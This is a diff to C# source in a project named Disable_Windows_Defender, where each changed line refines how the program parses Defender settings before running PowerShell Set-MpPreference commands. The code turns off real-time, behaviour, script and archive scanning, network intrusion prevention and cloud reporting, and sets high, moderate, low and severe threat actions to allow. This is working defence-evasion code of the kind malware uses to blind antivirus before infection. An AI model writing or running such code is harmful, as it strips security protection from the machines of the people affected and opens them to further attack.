@@ -62,49 +62,49 @@ namespace Disable_Windows_Defender
             {
                 string line = proc.StandardOutput.ReadLine();
 
-                if (line.Contains(@"DisableRealtimeMonitoring") && line.Contains("False"))
+                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
 
-                else if (line.Contains(@"DisableBehaviorMonitoring") && line.Contains("False"))
+                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
 
-                else if (line.Contains(@"DisableBlockAtFirstSeen") && line.Contains("False"))
+                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
 
-                else if (line.Contains(@"DisableIOAVProtection") && line.Contains("False"))
+                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
 
-                else if (line.Contains(@"DisablePrivacyMode") && line.Contains("False"))
+                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
 
-                else if (line.Contains(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.Contains("False"))
+                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
 
-                else if (line.Contains(@"DisableArchiveScanning") && line.Contains("False"))
+                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
 
-                else if (line.Contains(@"DisableIntrusionPreventionSystem") && line.Contains("False"))
+                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 
 
-                else if (line.Contains(@"DisableScriptScanning") && line.Contains("False"))
+                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                     RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
 
-                else if (line.Contains(@"SubmitSamplesConsent") && !line.Contains("2"))
+                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                     RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 
 
-                else if (line.Contains(@"MAPSReporting") && !line.Contains("0"))
+                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                     RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 
 
-                else if (line.Contains(@"HighThreatDefaultAction") && !line.Contains("6"))
+                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                     RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow
 
-                else if (line.Contains(@"ModerateThreatDefaultAction") && !line.Contains("6"))
+                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                     RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat
 
-                else if (line.Contains(@"LowThreatDefaultAction") && !line.Contains("6"))
+                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                     RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat
 
-                else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
+                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                     RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
             }
         }
